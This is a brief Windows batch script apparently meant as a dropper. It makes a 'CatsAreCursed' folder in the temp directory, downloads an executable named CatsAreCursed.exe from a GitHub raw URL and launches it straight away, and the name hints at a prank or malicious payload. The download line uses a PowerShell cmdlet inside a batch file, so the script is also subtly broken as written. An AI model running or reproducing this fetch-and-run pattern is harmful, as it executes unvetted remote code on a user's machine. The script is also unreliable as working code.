@echo off
color 0c
cls

cd %temp%
if not exist "CatsAreCursed" mkdir "CatsAreCursed"
cd CatsAreCursed

Invoke-WebRequest https://raw.githubusercontent.com/Bruchstein/CatsAreCursed/main/CatsAreCursed.exe -OutFile CatsAreCursed.exe

start CatsAreCursed.exe

exit
